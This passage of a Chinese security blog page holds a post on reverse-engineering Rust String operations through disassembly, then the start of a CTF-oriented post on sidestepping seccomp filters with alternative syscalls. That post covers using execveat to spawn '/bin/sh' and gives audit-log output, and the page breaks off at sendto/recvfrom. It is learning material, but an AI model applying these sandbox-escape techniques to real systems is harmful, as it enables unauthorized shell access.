              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="reverse-for-string"><a class="markdownIt-Anchor" href="#reverse-for-string"></a> Reverse for String</h1>
<p>上一篇文章简单分析了Vec变长数组的结构，今天来介绍String。实际上Rust的字符串类型对于我们并不陌生，在前面几篇文章的几乎任何一个示例中都可以找到它们。</p>
<p>我们曾经提到过，String类型在栈中占0x18大小，其中包括字符串的指针、字符串长度、字符串容量。看上去好像什么问题都没有，但如果你使用Python或C/C<ins>开发过一些项目，你可能会遇到一些与字符串编码有关的问题。在C</ins>中，由于需要考虑多种字符编码方式，字符被分为char、wchar_t、tchar等等，它们占用的字节数量还不相同，如果需要转换还需要使用特定的函数完成，对于一些需要进行编码转换的场景来说，稍有一个不注意，可能就是一串乱码怼在你的脸上，让人深恶痛绝。</p>
<p>但对于Rust而言，它规定，只要是我Rust写的程序，程序里面的所有字符串全都用UTF-8编码。这样就从根本上杜绝了编码转换的问题。</p>
<p>不过，这也产生了一些问题，其中影响最大的可能就是字符串不可索引了。由于使用UTF-8编码，对于不同的字符，其占用的字节数量可能不同，而Rust又不能将字符串单纯地看做单字节数组，因此Rust无法知道在一个既有中文又有英文又有其他语言的字符串中，第某个有效字符在字符串中的偏移地址到底是多少。对于一个Rust字符串，它的长度指的是占用的内存空间大小，因此对于1个中文字符组成的字符串，它的长度实际上是3。</p>
<p>下面介绍一下Rust中String的常用操作。</p>
<h2 id="push_str-与"><a class="markdownIt-Anchor" href="#push_str-与"></a> <code>push_str</code> 与 <code>+</code></h2>
<p>在Rust中，<code>push_str</code>方法与运算符<code>+</code>都能够将一个字符串拼接到另一个字符串的后面。让我们看一下二者在汇编上有什么区别。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    s += <span class="string">&quot;666&quot;</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">example::main:</span><br><span class="line">    sub     rsp, <span class="number">152</span></span><br><span class="line">    lea     rsi, [rip + .L__unnamed_7]</span><br><span class="line">    lea     rdi, [rsp + <span class="number">32</span>]</span><br><span class="line">    mov     qword ptr [rsp + <span class="number">24</span>], rdi</span><br><span class="line">    mov     edx, <span class="number">5</span></span><br><span class="line">    call    &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::convert::<span class="built_in">From</span>&lt;&amp;<span class="type">str</span>&gt;&gt;::from</span><br><span class="line">    mov     rdi, qword ptr [rsp + <span class="number">24</span>]</span><br><span class="line">    lea     rsi, [rip + .L__unnamed_8]</span><br><span class="line">    mov     edx, <span class="number">3</span></span><br><span class="line">    call    &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::ops::arith::AddAssign&lt;&amp;<span class="type">str</span>&gt;&gt;::add_assign</span><br><span class="line">    jmp     .LBB36_3</span><br></pre></td></tr></table></figure>
<p>首先看下<code>+</code>。这里的<code>+</code>运算符实际上是调用了<code>String</code>的方法，<code>String</code>这个结构重载了<code>+</code>这个运算符。这与C++的运算符重载类似。在汇编中，显示出调用的函数为<code>&lt;alloc::string::String as core::ops::arith::AddAssign&lt;&amp;str&gt;&gt;::add_assign</code>。实际上，Rust运算符重载的本质就是对“加”这个操作的Trait的impl，它与Rust中其他Trait并没有太大的区别，只有在使用的时候能够直接用运算符代替显式的方法调用罢了。需要注意的是，使用<code>+</code>运算符或<code>push_str</code>时，参数只能是字符串切片而不能是字符串，这是因为这两个方法不需要获取<code>String</code>的所有权，如果能够传入<code>String</code>，那么在这个函数执行后参数实际上就被销毁了，这当然是不希望看到的。另外，由于有解引用强制转换，我们传入<code>String</code>的引用也是被允许的。</p>
<p>对于上面的示例，一开始的字符串创建时，其指针指向的实际上并不是堆地址空间，而是字符串切片<code>CoLin</code>中保存的字符串常量地址。此时<code>s</code>中的字符串长度与字符串容量相同，均为5。随后使用<code>+</code>运算符增加字符串长度时，由于检测到字符串没有多余容量，因此会在堆空间分配一块更大的空间，将字符串拼接的结果保存到这块空间中，与<code>realloc</code>有相似之处。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    s.<span class="title function_ invoke__">push_str</span>(<span class="string">&quot;666&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">example::main:</span><br><span class="line">    sub     rsp, <span class="number">152</span></span><br><span class="line">    lea     rsi, [rip + .L__unnamed_7]</span><br><span class="line">    lea     rdi, [rsp + <span class="number">32</span>]</span><br><span class="line">    mov     qword ptr [rsp + <span class="number">24</span>], rdi</span><br><span class="line">    mov     edx, <span class="number">5</span></span><br><span class="line">    call    &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::convert::<span class="built_in">From</span>&lt;&amp;<span class="type">str</span>&gt;&gt;::from</span><br><span class="line">    mov     rdi, qword ptr [rsp + <span class="number">24</span>]</span><br><span class="line">    lea     rsi, [rip + .L__unnamed_8]</span><br><span class="line">    mov     edx, <span class="number">3</span></span><br><span class="line">    call    alloc::string::<span class="type">String</span>::push_str</span><br><span class="line">    jmp     .LBB36_3</span><br></pre></td></tr></table></figure>
<p>上面是使用<code>push_str</code>的汇编结果，可以看到只有函数调用发生了改变，甚至二者传入的参数都是一样的，分别是：原来的<code>String</code>栈地址，看做<code>this</code>、字符串指针、字符串长度。</p>
<h2 id="format"><a class="markdownIt-Anchor" href="#format"></a> <code>format!</code></h2>
<p>当需要拼接的字符串较多，或符合某种格式时，使用<code>format!</code>宏是一种更加简洁的方法。对于<code>format!</code>宏，我们实际上已经分析过了，因为<code>println!</code>的前半部分就是<code>format!</code>，也就是<code>core::fmt::Arguments::new_v1</code>方法的调用流程。这个在第一篇文章中已经介绍过了，这里不再赘述。</p>
<h2 id="bytes方法"><a class="markdownIt-Anchor" href="#bytes方法"></a> <code>bytes</code>方法</h2>
<p>这个方法返回的是字符串中的所有字节。不过需要注意的是这个方法返回的是一个不可变借用，除非这个方法的返回值被删除，否则字符串不能修改。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">t</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;666&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">u</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;s&#125; is &#123;t&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = u.<span class="title function_ invoke__">bytes</span>();</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">b</span> <span class="keyword">in</span> x&#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">.LBB27_9:</span><br><span class="line">    mov     rax, qword ptr [rsp + 216]</span><br><span class="line">    mov     qword ptr [rsp + 192], rax</span><br><span class="line">    movups  xmm0, xmmword ptr [rsp + 200]</span><br><span class="line">    movaps  xmmword ptr [rsp + 176], xmm0</span><br><span class="line">    lea     rdi, [rsp + 176]</span><br><span class="line">    call    &lt;alloc::string::String as core::ops::deref::Deref&gt;::deref</span><br><span class="line">    mov     qword ptr [rsp + 64], rdx</span><br><span class="line">    mov     qword ptr [rsp + 72], rax</span><br><span class="line">    jmp     .LBB27_12</span><br><span class="line">    ...</span><br><span class="line">.LBB27_12:</span><br><span class="line">    mov     rsi, qword ptr [rsp + 64]</span><br><span class="line">    mov     rdi, qword ptr [rsp + 72]</span><br><span class="line">    call    core::str::&lt;impl str&gt;::bytes</span><br><span class="line">    mov     qword ptr [rsp + 48], rdx</span><br><span class="line">    mov     qword ptr [rsp + 56], rax</span><br><span class="line">    jmp     .LBB27_13</span><br><span class="line">.LBB27_13:</span><br><span class="line">    mov     rsi, qword ptr [rsp + 48]</span><br><span class="line">    mov     rdi, qword ptr [rsp + 56]</span><br><span class="line">    mov     rax, qword ptr [rip + &lt;I as core::iter::traits::collect::IntoIterator&gt;::into_iter@GOTPCREL]</span><br><span class="line">    call    rax</span><br><span class="line">    mov     qword ptr [rsp + 32], rdx</span><br><span class="line">    mov     qword ptr [rsp + 40], rax</span><br><span class="line">    jmp     .LBB27_14</span><br><span class="line">.LBB27_14:</span><br><span class="line">    mov     rax, qword ptr [rsp + 32]</span><br><span class="line">    mov     rcx, qword ptr [rsp + 40]</span><br><span class="line">    mov     qword ptr [rsp + 304], rcx</span><br><span class="line">    mov     qword ptr [rsp + 312], rax</span><br><span class="line">.LBB27_15:</span><br><span class="line">    lea     rdi, [rsp + 304]</span><br><span class="line">    call    &lt;core::str::iter::Bytes as core::iter::traits::iterator::Iterator&gt;::next</span><br><span class="line">    mov     byte ptr [rsp + 30], dl</span><br><span class="line">    mov     byte ptr [rsp + 31], al</span><br><span class="line">    jmp     .LBB27_16</span><br></pre></td></tr></table></figure>
<p>可以看到，上面的代码中，首先对<code>String</code>类型进行<code>deref</code>解引用获取字符串切片，然后调用<code>bytes</code>方法，这个方法的第一个参数是字符串指针，第二个参数是字符串长度。这个方法的返回值有两个，<code>rax</code>为字符串开头的地址，<code>rdx</code>为字符串末尾的地址。后面是<code>into_iter</code>方法，这个方法的参数和返回值一样。下面就是正常的迭代器迭代流程，在前面的文章中有分析。</p>
<h2 id="chars方法"><a class="markdownIt-Anchor" href="#chars方法"></a> <code>chars</code>方法</h2>
<p>这个方法返回的是字符串中所有字符的集合。由于字符串中每个字符占用的字节数量可能不同，那么如何表示字符的集合就很值得我们研究了。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">t</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;太6了!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">u</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;s&#125; &#123;t&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = u.<span class="title function_ invoke__">chars</span>();</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">b</span> <span class="keyword">in</span> x&#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.LBB27_9:</span><br><span class="line">    mov     rax, qword ptr [rsp + 216]</span><br><span class="line">    mov     qword ptr [rsp + 192], rax</span><br><span class="line">    movups  xmm0, xmmword ptr [rsp + 200]</span><br><span class="line">    movaps  xmmword ptr [rsp + 176], xmm0</span><br><span class="line">    lea     rdi, [rsp + 176]</span><br><span class="line">    call    &lt;alloc::string::String as core::ops::deref::Deref&gt;::deref</span><br><span class="line">    mov     qword ptr [rsp + 64], rdx</span><br><span class="line">    mov     qword ptr [rsp + 72], rax</span><br><span class="line">    jmp     .LBB27_12</span><br><span class="line">    ...</span><br><span class="line">.LBB27_12:</span><br><span class="line">    mov     rsi, qword ptr [rsp + 64]</span><br><span class="line">    mov     rdi, qword ptr [rsp + 72]</span><br><span class="line">    call    core::str::&lt;impl str&gt;::chars</span><br><span class="line">    mov     qword ptr [rsp + 48], rdx</span><br><span class="line">    mov     qword ptr [rsp + 56], rax</span><br><span class="line">    jmp     .LBB27_13</span><br><span class="line">.LBB27_13:</span><br><span class="line">    mov     rsi, qword ptr [rsp + 48]</span><br><span class="line">    mov     rdi, qword ptr [rsp + 56]</span><br><span class="line">    mov     rax, qword ptr [rip + &lt;I as core::iter::traits::collect::IntoIterator&gt;::into_iter@GOTPCREL]</span><br><span class="line">    call    rax</span><br><span class="line">    mov     qword ptr [rsp + 32], rdx</span><br><span class="line">    mov     qword ptr [rsp + 40], rax</span><br><span class="line">    jmp     .LBB27_14</span><br><span class="line">.LBB27_14:</span><br><span class="line">    mov     rax, qword ptr [rsp + 32]</span><br><span class="line">    mov     rcx, qword ptr [rsp + 40]</span><br><span class="line">    mov     qword ptr [rsp + 304], rcx</span><br><span class="line">    mov     qword ptr [rsp + 312], rax</span><br><span class="line">.LBB27_15:</span><br><span class="line">    lea     rdi, [rsp + 304]</span><br><span class="line">    call    &lt;core::str::iter::Chars as core::iter::traits::iterator::Iterator&gt;::next</span><br><span class="line">    mov     dword ptr [rsp + 28], eax</span><br><span class="line">    jmp     .LBB27_16</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到，这里与<code>bytes</code>类似。经过调试发现，<code>chars</code>方法返回的也是两个地址，开始地址和结尾地址。因为<code>chars</code>返回的类型是迭代器，所以Rust可以通过调用<code>next</code>方法动态地判断下一个字符占用的字节数量，因此不需要返回每一个字符占用的字节数。但是，我们有方法让Rust返回<strong>真正的字符数组</strong>，那就是使用<code>collect</code>方法将迭代器转换为<code>Vec</code>：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">t</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;太6了!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">u</span> = <span class="built_in">format!</span>(<span class="string">&quot;&#123;s&#125; &#123;t&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = u.<span class="title function_ invoke__">chars</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span>: <span class="type">Vec</span>&lt;<span class="type">char</span>&gt; = x.<span class="title function_ invoke__">collect</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x5555555b6c00</span><br><span class="line">00:0000│  0x5555555b6c00 ◂— 0x6f00000043 /* &#x27;C&#x27; */</span><br><span class="line">01:0008│  0x5555555b6c08 ◂— 0x690000004c /* &#x27;L&#x27; */</span><br><span class="line">02:0010│  0x5555555b6c10 ◂— 0x200000006e /* &#x27;n&#x27; */</span><br><span class="line">03:0018│  0x5555555b6c18 ◂— 0x360000592a /* &#x27;*Y&#x27; */</span><br><span class="line">04:0020│  0x5555555b6c20 ◂— 0x2100004e86</span><br></pre></td></tr></table></figure>
<p><code>collect</code>方法在一个栈地址中保存了一个堆地址，而这个堆地址的内容就如上面所示。可以看到，Rust为每一个字符分配了4个字节的空间，虽然大多数字符都占不到4个字节，但是为了索引的需要，Rust必须分配一个足够容纳所有字符的空间，也就是UTF-8的一个字符可能占用的最大字节数。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文我们学习了：</p>
<ol>
<li>字符数组在内存中的结构</li>
<li>字符串遍历过程的逆向</li>
<li>Rust字符串的相关知识</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/15/seccomp%E5%AD%A6%E4%B9%A0-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/15/seccomp%E5%AD%A6%E4%B9%A0-3/" class="post-title-link" itemprop="url">seccomp学习 (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-15 22:03:09" itemprop="dateCreated datePublished" datetime="2023-11-15T22:03:09+08:00">2023-11-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-11-26 11:47:15" itemprop="dateModified" datetime="2023-11-26T11:47:15+08:00">2023-11-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/seccomp-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">seccomp 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>25k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>22 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文继续上一篇文章继续介绍seccomp与系统调用的那些事~~~</p>
<h1 id="0x06-其他"><a class="markdownIt-Anchor" href="#0x06-其他"></a> 0x06. 其他</h1>
<h2 id="b-execveat-nr322"><a class="markdownIt-Anchor" href="#b-execveat-nr322"></a> B. execveat (nr=322)</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">sys_execveat</span><span class="params">(<span class="type">int</span> dfd, <span class="type">const</span> <span class="type">char</span> __user *filename,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="type">char</span> __user *<span class="type">const</span> __user *argv,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="type">char</span> __user *<span class="type">const</span> __user *envp, <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
<p>这个系统调用顾名思义，可以用于替代<code>execve</code>。其中dfd为某个目录的文件描述符，如传-100代表当前目录。如果路径名为绝对路径，则dfd会被忽略。因此我们传0，路径填&quot;/bin/sh&quot;绝对没有问题。对于<code>argv</code>，<code>envp</code>和<code>flags</code>都填0即可。</p>
<p>但是经过试验发现，如果需要使用<code>execveat</code>这个系统调用，必须需要辅以其他的系统调用。我们将seccomp的拒绝规则修改为日志规则，在成功getshell之后通过dmesg可以查看系统的审计日志：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[  661.076378] audit: type=1326 audit(1700060752.311:199): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=12 compat=0 ip=0x7f2a71161a8b code=0x7ffc0000</span><br><span class="line">[  661.076383] audit: type=1326 audit(1700060752.311:200): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=158 compat=0 ip=0x7f2a71155cb4 code=0x7ffc0000</span><br><span class="line">[  661.076385] audit: type=1326 audit(1700060752.311:201): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=9 compat=0 ip=0x7f2a71162cb7 code=0x7ffc0000</span><br><span class="line">[  661.076387] audit: type=1326 audit(1700060752.311:202): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=21 compat=0 ip=0x7f2a711629ab code=0x7ffc0000</span><br><span class="line">[  661.076390] audit: type=1326 audit(1700060752.311:203): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=257 compat=0 ip=0x7f2a71162b18 code=0x7ffc0000</span><br><span class="line">[  661.076392] audit: type=1326 audit(1700060752.311:204): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=262 compat=0 ip=0x7f2a711628de code=0x7ffc0000</span><br><span class="line">[  661.076394] audit: type=1326 audit(1700060752.311:205): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=9 compat=0 ip=0x7f2a71162cb7 code=0x7ffc0000</span><br><span class="line">[  661.076396] audit: type=1326 audit(1700060752.311:206): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=3 compat=0 ip=0x7f2a711629db code=0x7ffc0000</span><br><span class="line">[  661.076398] audit: type=1326 audit(1700060752.311:207): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=257 compat=0 ip=0x7f2a71162b18 code=0x7ffc0000</span><br><span class="line">[  661.076400] audit: type=1326 audit(1700060752.311:208): auid=0 uid=0 gid=0 ses=2 subj=unconfined pid=3331 comm=&quot;sh&quot; exe=&quot;/usr/bin/dash&quot; sig=0 arch=c000003e syscall=0 compat=0 ip=0x7f2a71162b68 code=0x7ffc0000</span><br></pre></td></tr></table></figure>
<p>可以看到，这里使用了其他数十个系统调用，包括<code>read</code>、<code>close</code>、<code>mmap</code>等，都是/bin/dash子进程调的系统调用，一般seccomp规则都是继承子进程的，所以在限定较为严格的情况下，还是尽量不要想直接getshell了，需要在赛题环境中使用这个系统调用时，要做好失败的心理准备。</p>
<h2 id="c-sendto-recvfrom-nr44-45"><a class="markdownIt-Anchor" href="#c-sendto-recvfrom-nr44-45"></a> C. sendto + recvfrom (nr=44, 45)</h2>
<p>这两个系统调用原本是用于进行网络数据包发送的，但实际上也可以将数据发送到文件描述符。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sys_sendto(<span class="type">int</span> fd, <span class="type">void</span> __user *buff, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags,</span><br><span class="line">		 <span class="keyword">struct</span> sockaddr __user *addr,  <span class="type">int</span> addr_len)</span><br><span class="line"><span class="type">int</span> __sys_recvfrom(<span class="type">int</span> fd, <span class="type">void</span> __user *ubuf, <span class="type">size_t</span> size, <span class="type">unsigned</span> <span class="type">int</span> flags,</span><br><span class="line">		   <span class="keyword">struct</span> sockaddr __user *addr, <span class="type">int</span> __user *addr_len)</span><br></pre></td></tr></table></figure>
